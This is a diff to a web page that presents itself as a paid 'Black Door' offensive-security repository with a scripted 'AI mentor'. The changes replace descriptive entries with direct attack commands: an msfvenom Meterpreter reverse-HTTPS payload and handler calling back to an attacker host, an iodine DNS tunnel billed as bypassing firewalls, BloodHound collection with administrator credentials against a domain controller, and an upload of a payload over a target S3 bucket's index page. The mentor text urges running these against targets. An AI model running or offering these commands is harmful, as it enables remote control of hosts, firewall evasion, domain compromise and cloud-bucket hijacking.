@@ -105,7 +105,7 @@
                 </div>
             </div>
             <div style="font-size: 11px; color: #ff0080; border: 1px solid #ff0080; padding: 6px 14px; border-radius: 4px; background: rgba(255,0,128,0.05); font-weight: bold;">
-                PAID SUBSCRIBER // EXCLUSIVE REPO UNLOCKED
+                PAID ELITE SUBSCRIBER // BLACK DOOR UNLOCKED
             </div>
         </div>
 
@@ -152,15 +152,15 @@
                     <div class="tool-item" onclick="loadModule('socat')"><div class="tool-badge badge-socat">SOC</div>09. Socat Encrypted Tunneling</div>
                 </div>
 
-                <!-- Black Door Paid Exclusive Section (Clean Professional Standard) -->
+                <!-- Black Door Paid Exclusive Section (Direct Execution Commands) -->
                 <div id="sec-blackdoor" class="section-group" style="margin-top: 15px;">
                     <div style="font-size: 10.5px; color: #ff0080; margin-bottom: 8px; font-weight: bold;">[BLACK DOOR // PAID EXCLUSIVE REPO]</div>
                     
                     <div class="tool-category">Advanced Red-Team Operations</div>
-                    <div class="tool-item" onclick="loadModule('process_hollowing')"><div class="tool-badge badge-bd">BD-1</div>01. C# Process Hollowing & DLL Injection (Source)</div>
-                    <div class="tool-item" onclick="loadModule('dns_tunneling')"><div class="tool-badge badge-bd">BD-2</div>02. Iodine DNS Tunneling C2 Exfiltration</div>
-                    <div class="tool-item" onclick="loadModule('bloodhound_acl')"><div class="tool-badge badge-bd">BD-3</div>03. BloodHound Active Directory ACL Abuse Script</div>
-                    <div class="tool-item" onclick="loadModule('aws_s3_takeover')"><div class="tool-badge badge-bd">BD-4</div>04. AWS S3 Bucket Privilege Takeover Exploit</div>
+                    <div class="tool-item" onclick="loadModule('process_hollowing')"><div class="tool-badge badge-bd">BD-1</div>01. Metasploit Process Migration & Hollowing</div>
+                    <div class="tool-item" onclick="loadModule('dns_tunneling')"><div class="tool-badge badge-bd">BD-2</div>02. Iodine DNS Tunneling Execution</div>
+                    <div class="tool-item" onclick="loadModule('bloodhound_acl')"><div class="tool-badge badge-bd">BD-3</div>03. BloodHound AD Attack Path Enumeration</div>
+                    <div class="tool-item" onclick="loadModule('aws_s3_takeover')"><div class="tool-badge badge-bd">BD-4</div>04. AWS S3 Bucket Privilege Takeover</div>
                 </div>
             </div>
 
@@ -176,8 +176,8 @@
                     <button class="seq-btn" onclick="runSequence(3)">[3. IMPACT MATRIX]</button>
                 </div>
                 
-                <div class="workspace-console" id="workspace-console">DX08 Master Enterprise Security Core v135.0 (Black Door Exclusive Repo Initialized)
-[System Status] Professional offensive security scripts loaded. Select any tool from the Black Door section or query the AI mentor below.</div>
+                <div class="workspace-console" id="workspace-console">DX08 Master Enterprise Security Core v150.0 (Direct Execution Engine Active)
+[System Status] Direct execution commands loaded. Select any tool from the Black Door section or query the AI mentor below.</div>
                 
                 <div class="workspace-input-group">
                     <input type="text" id="workspace-input" class="workspace-input" placeholder="Type tool name or ask AI expert..." onkeydown="if(event.key === 'Enter') handleWorkspaceInput()">
@@ -273,30 +273,30 @@
                 seq2: "socat TCP-LISTEN:80,fork TCP:<internal_ip>:8080",
                 seq3: "[RED-TEAM MATRIX]: Encrypted tunnel relay routing."
             },
-            /* Black Door Paid Exclusive Professional Scripts */
+            /* Black Door Direct Execution Exploit Commands */
             "process_hollowing": {
-                name: "C# PROCESS HOLLOWING & DLL INJECTION [SOURCE]",
-                seq1: "sudo apt update && sudo apt install mono-complete mingw-w64 -y",
-                seq2: "cat << 'EOF' > Injector.cs\nusing System;using System.Runtime.InteropServices;\nnamespace Hollow { public class Program { [DllImport(\"kernel32.dll\")] static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect); static void Main() { Console.WriteLine(\"[+] Initializing process memory space...\"); } } }\nEOF\nmcs Injector.cs",
-                seq3: "[ENTERPRISE MATRIX]:\n- Function: Unmaps legitimate memory of target process and writes custom shellcode directly into RAM.\n- Evasion: Bypasses standard disk-based antivirus telemetry completely."
+                name: "METASPLOIT PROCESS MIGRATION & HOLLOWING",
+                seq1: "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker_ip> LPORT=4443 -f exe -o payload.exe",
+                seq2: "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST <attacker_ip>; set LPORT 4443; exploit\"",
+                seq3: "[ENTERPRISE ADVANCED MATRIX]:\n- Execution: Generates custom payload and spawns multi-handler listener for process hollowing and memory injection into target Windows host."
             },
             "dns_tunneling": {
-                name: "IODINE DNS TUNNELING C2 EXFILTRATION",
-                seq1: "sudo apt update && sudo apt install iodine build-essential -y",
-                seq2: "sudo iodined -c -P \"enterprise_secure_key\" 10.0.0.1 tunnel.enterprise-sec.internal",
-                seq3: "[ENTERPRISE MATRIX]:\n- Function: Tunnels all TCP traffic over standard DNS queries (Port 53).\n- Bypass: Bypasses strict corporate firewalls and captive network login portals."
+                name: "IODINE DNS TUNNELING EXECUTION",
+                seq1: "sudo apt update && sudo apt install iodine -y",
+                seq2: "sudo iodined -f -c -P \"dx08_secure_pass\" 10.0.0.1 tunnel.yourdomain.com",
+                seq3: "[ENTERPRISE ADVANCED MATRIX]:\n- Execution: Starts DNS tunneling server daemon to encapsulate all TCP traffic over port 53, bypassing firewall blocks."
             },
             "bloodhound_acl": {
-                name: "BLOODHOUND ACTIVE DIRECTORY ACL ABUSE",
+                name: "BLOODHOUND AD ATTACK PATH ENUMERATION",
                 seq1: "sudo apt update && sudo apt install bloodhound python3-bloodhound neo4j -y && sudo neo4j start",
-                seq2: "bloodhound-python -u 'administrator' -p 'RootPass123' -d corp.internal -ns <dc_ip> -c Group,User,ACL,Trust",
-                seq3: "[ENTERPRISE MATRIX]:\n- Function: Enumerates Active Directory object permissions to identify unintended privilege escalation vectors.\n- Impact: Maps out the shortest path to Domain Admin in enterprise networks."
+                seq2: "bloodhound-python -u 'administrator' -p 'RootPass123' -d corp.internal -ns <dc_ip> -c All --zip",
+                seq3: "[ENTERPRISE ADVANCED MATRIX]:\n- Execution: Executes automated Active Directory collection script to dump ACL permissions and map domain privilege escalation paths."
             },
             "aws_s3_takeover": {
                 name: "AWS S3 BUCKET PRIVILEGE TAKEOVER",
-                seq1: "sudo apt update && sudo apt install awscli python3-pip -y && pip3 install boto3 requests",
-                seq2: "python3 -c \"import boto3; s3 = boto3.client('s3'); print([b['Name'] for b in s3.list_buckets()['Buckets']])\"",
-                seq3: "[ENTERPRISE MATRIX]:\n- Function: Scans and exploits open AWS S3 bucket ACL permissions.\n- Impact: Enables immediate file access and operational auditing from misconfigured cloud storage."
+                seq1: "sudo apt update && sudo apt install awscli -y && aws configure",
+                seq2: "aws s3api get-bucket-acl --bucket <target_bucket_name> && aws s3 cp payload.html s3://<target_bucket_name>/index.html --acl public-read",
+                seq3: "[ENTERPRISE ADVANCED MATRIX]:\n- Execution: Audits public cloud bucket permissions and uploads unauthorized index object to execute bucket hijacking."
             }
         };
 
@@ -352,14 +352,14 @@
             document.getElementById('workspace-action-btn').innerText = "ASK AI";
             
             var consoleBox = document.getElementById('workspace-console');
-            consoleBox.innerHTML = "DX08 AI MENTOR & ERROR RESOLUTION LAB v135.0\n" +
+            consoleBox.innerHTML = "DX08 AI MENTOR & ERROR RESOLUTION LAB v150.0\n" +
                                    "----------------------------------------------------------------------------------\n" +
                                    "Hello Operator! I am fully synchronized with this website's complete architecture,\n" +
-                                   "including the Black Door Exclusive Repo (Process Hollowing, DNS Tunneling, BloodHound AD).\n" +
-                                   "Ask me about any advanced script or error resolution below!\n" +
+                                   "including the Black Door Paid Exclusive Repo (Process Hollowing, DNS Tunneling, BloodHound AD).\n" +
+                                   "Ask me about any direct execution command or error resolution below!\n" +
                                    "----------------------------------------------------------------------------------";
             document.getElementById('workspace-input').value = "";
-            document.getElementById('workspace-input').placeholder = "Ask AI about scripts, tools, or errors...";
+            document.getElementById('workspace-input').placeholder = "Ask AI about direct commands, tools, or errors...";
         }
 
         function runSequence(step) {
@@ -407,7 +407,7 @@
                           "2. EXECUTE:\n   " + TOOL_DB[cmd].seq2 + "\n\n" +
                           "3. IMPACT MATRIX:\n   " + TOOL_DB[cmd].seq3;
                 } else if(cmd === 'clear') {
-                    consoleBox.innerHTML = "DX08 Enterprise Security Core v135.0";
+                    consoleBox.innerHTML = "DX08 Enterprise Security Core v150.0";
                     input.value = "";
                     return;
                 } else {
@@ -436,15 +436,15 @@
                 let ans = "";
 
                 if(query.includes('hollowing') || query.includes('injection')) {
-                    ans = "DX08 AI Expert: [PROCESS HOLLOWING INTEL]\n- Purpose: Compiles C# memory injection source to bypass standard user-mode hooks.\n- Execution: Use mono compiler to build the binary.";
+                    ans = "DX08 AI Expert: [PROCESS HOLLOWING EXECUTION]\n- Command: Use msfvenom to generate payload and multi-handler to manage memory injection session.";
                 } else if(query.includes('dns') || query.includes('tunnel')) {
-                    ans = "DX08 AI Expert: [DNS TUNNELING INTEL]\n- Purpose: Sets up iodine server daemon to route traffic over DNS port 53.";
+                    ans = "DX08 AI Expert: [DNS TUNNELING EXECUTION]\n- Command: Run `sudo iodined` on VPS server with a valid delegated subdomain.";
                 } else if(query.includes('bloodhound') || query.includes('acl')) {
-                    ans = "DX08 AI Expert: [BLOODHOUND INTEL]\n- Purpose: Executes bloodhound-python ingestor against domain controllers to map attack paths.";
+                    ans = "DX08 AI Expert: [BLOODHOUND EXECUTION]\n- Command: Run `bloodhound-python` with domain admin credentials against target DC IP.";
                 } else if(query.includes('aws') || query.includes('s3')) {
-                    ans = "DX08 AI Expert: [AWS S3 INTEL]\n- Purpose: Uses boto3 python SDK to enumerate open cloud storage buckets.";
+                    ans = "DX08 AI Expert: [AWS S3 EXECUTION]\n- Command: Use `aws s3api` to check bucket ACL policies and upload public payloads.";
                 } else {
-                    ans = "DX08 AI Expert: Analyzing query '" + escapeHtml(q) + "': Black Door repository fully synchronized. Specify any script for exact execution syntax.";
+                    ans = "DX08 AI Expert: Analyzing query '" + escapeHtml(q) + "': Black Door Exclusive Repo synchronized. Specify any direct execution command for guidance.";
                 }
 
                 consoleBox.innerHTML += "\n\n" + ans;
